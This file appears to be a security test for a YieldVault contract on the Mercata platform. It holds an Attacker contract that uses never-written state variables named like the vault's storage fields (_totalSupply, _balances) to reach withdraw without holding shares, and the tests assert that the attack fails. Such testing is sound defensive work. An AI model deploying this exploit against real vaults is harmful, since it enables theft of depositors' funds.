import "../../concrete/BaseCodeCollection.sol";
import "../../abstract/ERC20/ERC20.sol";
import "../../abstract/ERC20/IERC20.sol";
import "../../concrete/Tokens/Token.sol";
import "../../concrete/Proxy/Proxy.sol";
import "../../concrete/YieldVault/YieldVault.sol";

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        variadic result = address(a).call(f, args);
        return result;
    }
}

// The attacker: an ordinary contract anyone can deploy. It holds no asset tokens and no vault shares.
// Its only trick is a never-written state variable whose NAME equals a storage field of the victim.
contract Attacker {
    uint _totalSupply;                      // never written: reading it yields a reference to the path "_totalSupply"
    mapping(address => uint) _balances;     // never written: _balances[x] yields a reference to "_balances[x]"
    address vault;
    constructor(address _vault) { vault = _vault; }

    // withdraw(uint256 assets, address receiver, address owner_) with assets = phantom reference
    function attackTotalSupply() public { hop(_totalSupply, address(this), address(this)); }
    function attackBalanceOf(address holder) public { hop(_balances[holder], address(this), address(this)); }
    // msg.data inside hop is variadic([variadic(args)]): the inner variadic survives the splice at the call site
    function hop(variadic x) internal { address(vault).call("withdraw", msg.data); }
}

contract Describe_YieldVaultPhantom {
    uint public INFINITY = 2 ** 256 - 1;
    Mercata m;
    YieldVault vault;      // the platform YieldVault logic behind the platform Proxy
    address asset;
    User honest;
    Attacker attacker;

    function beforeAll() public {
        m = new Mercata();
    }

    function beforeEach() public {
        (bool executed, variadic ret) = m.adminRegistry().castVoteOnIssue(address(m.tokenFactory()), "createToken", "ETH", "Wrapped ETH", [], [], [], "ETH", 0, 18);
        asset = address(ret);
        m.adminRegistry().castVoteOnIssue(asset, "setStatus", 2);
        address impl = address(new YieldVault(address(this)));
        vault = YieldVault(address(new Proxy(impl, address(this))));
        vault.initialize(asset, "ETH Carry Vault", "carryETH");

        honest = new User();
        m.adminRegistry().castVoteOnIssue(asset, "mint", address(honest), 1000e18);
        honest.do(asset, "approve", address(vault), INFINITY);
        honest.do(address(vault), "deposit(uint256,address)", 1000e18, address(honest));

        attacker = new Attacker(address(vault));
    }

    function it_a_setup_is_sane() public {
        require(IERC20(asset).balanceOf(address(vault)) == 1000e18, "vault should hold the deposit");
        require(vault.balanceOf(address(honest)) == 1000e18, "honest user should hold shares");
        require(vault.balanceOf(address(attacker)) == 0, "attacker has no shares");
        require(IERC20(asset).balanceOf(address(attacker)) == 0, "attacker has no assets");
    }

    // Safe behaviour: an account with no shares cannot withdraw assets.
    function it_b_account_without_shares_cannot_withdraw_totalSupply_path() public {
        try { attacker.attackTotalSupply(); } catch { }
        uint stolen = IERC20(asset).balanceOf(address(attacker));
        require(stolen == 0, "attacker with zero shares withdrew " + string(stolen) + " of the asset; vault now holds " + string(IERC20(asset).balanceOf(address(vault))) + "; honest user's shares " + string(vault.balanceOf(address(honest))));
    }

    function it_c_account_without_shares_cannot_withdraw_balances_path() public {
        try { attacker.attackBalanceOf(address(honest)); } catch { }
        uint stolen = IERC20(asset).balanceOf(address(attacker));
        require(stolen == 0, "attacker with zero shares withdrew " + string(stolen) + " of the asset; vault now holds " + string(IERC20(asset).balanceOf(address(vault))));
    }
}
